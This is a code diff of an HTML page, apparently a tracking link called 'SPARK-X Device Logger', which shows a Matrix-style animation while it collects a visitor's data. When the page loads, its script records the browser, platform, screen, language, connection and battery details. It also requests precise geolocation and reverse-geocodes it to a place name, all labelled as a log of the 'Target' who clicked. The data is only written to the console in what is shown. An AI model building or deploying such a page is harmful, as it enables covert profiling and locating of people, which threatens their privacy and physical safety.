@@ -2,47 +2,117 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>SPARK-X Ping</title>
+  <title>SPARK-X Device Logger</title>
   <style>
-    body {
-      background-color: #0f0f0f;
-      color: #0f0f0f; /* Invisible text */
-      font-family: monospace;
-      text-align: center;
-      padding-top: 50px;
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: black;
+      overflow: hidden;
+    }
+    canvas {
+      display: block;
     }
   </style>
 </head>
 <body>
-  <p>Loading...</p>
+  <canvas id="matrix"></canvas>
 
   <script>
-    console.log("🔔 Target clicked the link at " + new Date().toISOString());
+    // 📡 Device + Location Logger
+    async function logDeviceAndLocation() {
+      const log = {
+        clicked: true,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        screen: {
+          width: screen.width,
+          height: screen.height,
+          orientation: screen.orientation?.type || "unknown"
+        },
+        language: navigator.language,
+        connection: navigator.connection?.type || "unknown",
+        battery: "unsupported",
+        location: "pending"
+      };
 
-    navigator.geolocation.getCurrentPosition(async position => {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-
-      try {
-        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
-        const data = await response.json();
-        const place = data.address.suburb || data.address.village || data.address.town || data.address.city || "Unknown";
-
-        const log = {
-          clicked: true,
-          latitude: lat,
-          longitude: lon,
-          area: place,
-          timestamp: new Date().toISOString()
-        };
-
-        console.log("📍 Location Log:", log);
-      } catch (err) {
-        console.error("Geocoding error:", err);
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          log.battery = {
+            level: battery.level,
+            charging: battery.charging
+          };
+        } catch {
+          log.battery = "error";
+        }
       }
-    }, error => {
-      console.error("Location error:", error);
-    });
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          try {
+            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+            const data = await response.json();
+            const place = data.address.suburb || data.address.village || data.address.town || data.address.city || "Unknown";
+
+            log.location = {
+              latitude: lat,
+              longitude: lon,
+              area: place
+            };
+
+            console.log("📡 SPARK-X Full Log:", log);
+          } catch {
+            log.location = { latitude: lat, longitude: lon, area: "reverse lookup failed" };
+            console.log("📡 SPARK-X Full Log:", log);
+          }
+        }, error => {
+          log.location = "location error: " + error.message;
+          console.log("📡 SPARK-X Full Log:", log);
+        });
+      } else {
+        log.location = "geolocation not supported";
+        console.log("📡 SPARK-X Full Log:", log);
+      }
+    }
+
+    logDeviceAndLocation();
+
+    // 🧪 CMatrix Visual Stream
+    const canvas = document.getElementById("matrix");
+    const ctx = canvas.getContext("2d");
+
+    canvas.height = window.innerHeight;
+    canvas.width = window.innerWidth;
+
+    const chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZあいうえお漢字测试数据";
+    const fontSize = 14;
+    const columns = canvas.width / fontSize;
+    const drops = Array(Math.floor(columns)).fill(1);
+
+    function drawMatrix() {
+      ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+      ctx.fillStyle = "#00ffcc";
+      ctx.font = fontSize + "px monospace";
+
+      for (let i = 0; i < drops.length; i++) {
+        const text = chars[Math.floor(Math.random() * chars.length)];
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+          drops[i] = 0;
+        }
+        drops[i]++;
+      }
+    }
+
+    setInterval(drawMatrix, 50);
   </script>
 </body>
 </html>
